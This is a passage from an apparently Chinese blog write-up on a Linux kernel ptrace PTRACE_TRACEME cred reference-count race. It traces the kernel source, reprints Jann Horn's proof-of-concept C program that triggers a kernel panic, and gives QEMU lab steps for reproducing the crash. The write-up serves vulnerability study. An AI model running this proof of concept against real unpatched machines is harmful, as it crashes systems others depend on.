        key_put(cred->process_keyring);
        key_put(cred->thread_keyring);
        key_put(cred->request_key_auth);
        if (cred->group_info)
            put_group_info(cred->group_info);
        free_uid(cred->user);
        put_user_ns(cred->user_ns);
        kmem_cache_free(cred_jar, cred);
    }
主要就是解除cred 的一些引用，最后调用 `kmem_cache_free` 释放这一块内存
## 漏洞分析
okay 终于完了，接下来我们正式看一下这个漏洞
###  漏洞触发点
漏洞出现在 ptrace 使用request 参数为 PTRACE_TRACEME的时候  
它的调用链如下
`ptrace` ->`ptrace_traceme` -> `ptrace_link` -> `__ptrace_link`
我们一个一个看
在
[kernel/ptrace.c](https://elixir.bootlin.com/linux/v5.1.16/source/kernel/ptrace.c)
    SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
            unsigned long, data)
    {
        struct task_struct *child;
        long ret;
        if (request == PTRACE_TRACEME) {
            ret = ptrace_traceme();
            if (!ret)
                arch_ptrace_attach(current);
            goto out;
        }
ptrace 系统调用 传入 PTRACE_TRACEME request 的时候会进入 ptrace_traceme 函数，没有什么，进入看看
    static int ptrace_traceme(void)
    {
        int ret = -EPERM;
        write_lock_irq(&tasklist_lock);
        /* Are we already being traced? */
        if (!current->ptrace) {
            ret = security_ptrace_traceme(current->parent);
    ...
            if (!ret && !(current->real_parent->flags & PF_EXITING)) {
            // 设置当前进程 被 trace
                current->ptrace = PT_PTRACED;
                ptrace_link(current, current->real_parent);
            }
        }
        write_unlock_irq(&tasklist_lock);
        return ret;
    }
`ptrace_traceme`前面做一些权限检查，然后设置当前进程被 trace ,调用 `ptrace_link` 函数, 注意这里传入的第二个参数是
`current->real_parent` 也就是其父进程的 task_struct
    static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
    {
        rcu_read_lock();
        __ptrace_link(child, new_parent, __task_cred(new_parent));
        rcu_read_unlock();
    }
    #define __task_cred(task)    
        rcu_dereference((task)->real_cred)
主要看第三个参数 `__task_cred(new_parent)` 这一句，它调用`rcu_dereference` 获取
`new_parent->real_cred` 的引用，也就是父进程的 cred 结构体的地址啦
接着传入了 `__ptrace_link`函数
    void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
               const struct cred *ptracer_cred)
    {
        BUG_ON(!list_empty(&child->ptrace_entry));
        list_add(&child->ptrace_entry, &new_parent->ptraced);
        child->parent = new_parent;
        child->ptracer_cred = get_cred(ptracer_cred);
    }
    //------------------     static inline const struct cred *get_cred(const struct cred *cred)
    {
        struct cred *nonconst_cred = (struct cred *) cred;
        if (!cred)
            return cred;
        validate_creds(cred);
        return get_new_cred(nonconst_cred);
    }
    //----------------    static inline struct cred *get_new_cred(struct cred *cred)
    {
        atomic_inc(&cred->usage);
        return cred;
    }
最后一句 `child->ptracer_cred = get_cred(ptracer_cred);` 子进程保存了父进程的 cred 结构体 到
`ptracer_cred` 字段里面, `get_cred` 作用是让cred的引用计数+1，这里也是漏洞点所在。  
结合前面我们对 `setresuid` 函数的分析，接入在 `get_cred` 函数调用之前 父进程调用了 `setresuid`函数，那么原来的
cred 就会被替换，原来的 cred 结构体的引用计数可能就变成 0 了，这个时候会通过 `call_rcu` 调用`put_cred_rcu`
来释放这块内存，如果这个时候 get_cred 被调用了,引用计数 +1, 就会触发下面代码，产生 kernel panic
        if (atomic_read(&cred->usage) != 0)
            panic("CRED: put_cred_rcu() sees %p with usage %dn",
                  cred, atomic_read(&cred->usage));
###  poc 分析
下面 jannh 给出 的poc
     #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int grandchild_fn(void *dummy) {
      if (ptrace(PTRACE_TRACEME, 0, NULL, NULL))
        err(1, "traceme");
      return 0;
    }
    int main(void) {
      pid_t child = fork();
      if (child == -1) err(1, "fork");
      /* child */
      if (child == 0) {
        static char child_stack[0x100000];
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        while (1) {
          if (clone(grandchild_fn, child_stack+sizeof(child_stack), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_PARENT|CLONE_VM|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_VFORK, NULL) == -1)
            err(1, "clone failed");
        }
      }
      /* parent */
      uid_t uid = getuid();
      while (1) {
        // 
        if (setresuid(uid, uid, uid)) err(1, "setresuid");
      }
    }
poc 十分简单
  * task A fork 出 task B
  * task A 不断 setresuid 更新自己的 cred
  * task B 不断调用 `ptrace(PTRACE_TRACEME, 0, NULL, NULL)` 尝试触发竞争
主要能够在 task A `put_cred_rcu` 被调用的时候 ,task B 运行到 `get_cred` 就可以触发内核panic
###  漏洞复现
**测试环境搭建**
测试环境可以直接安装个 ubuntu 的虚拟机来测  
这里笔者使用 qemu 来做测试，测试环境笔者参考了 syzkaller 的环境配置  
[参考设置](https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md)
[linux
源码下载](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-6994eefb0053799d2e07cd140df6c2ea106c41ee.tar.gz)  
下载后 编辑 `kernel/ptrace.c` 改成有bug 的版本
      */                                                                                
    static void ptrace_link(struct task_struct *child, struct task_struct *new_parent) 
    {                                                                                  
        rcu_read_lock();                                                               
        __ptrace_link(child, new_parent, __task_cred(new_parent));                     
        rcu_read_unlock();                                                             
        /*__ptrace_link(child, new_parent, current_cred());*/                          
    }
    make defconfig
    make menuconfig
    // 编辑 .config, 在最后加上 
    // CONFIG_CONFIGFS_FS=y
    // CONFIG_SECURITYFS=y
    make oldconfig
    make -j16
文件系统笔者使用了 syzkaller 中的
[create_image.sh](https://github.com/google/syzkaller/blob/master/tools/create-image.sh) 来创建
完成之后可以用下面命令运行
    qemu-system-x86_64 -kernel ./linux/arch/x86_64/boot/bzImage  -append "console=ttyS0 root=/dev/sda debug earlyprintk=serial nokaslr" -hda strechsome/stretch.img -net user,hostfwd=tcp::10021-:22 -net nic -enable-kvm  -nographic -m 2G  -smp 2 -s
因为它这里需要竞争，`call_rcu` 函数又是不可中断的，所以在单个cpu下要触发很难，这里设置参数`-smp 2` 给了两个cp
**poc 测试**
把上面的 poc 编译好之后拷贝到 文件系统里面
    gcc poc.c --static
    mount strechsome/stretch.img ./tmp
    cp ./a.out ./tmp
    umount ./tmp
运行虚拟机你会发现下面的崩溃
## 总结
这个漏洞还是比较简单的，复现条件不会十分的苛刻，ptrace之前自己也学过一段时间，也看过一些源码，但是没有关注到这个部分的内容, jannh 真实tql。  
下一篇文章我会分析jannh 提出的第二个问题
## reference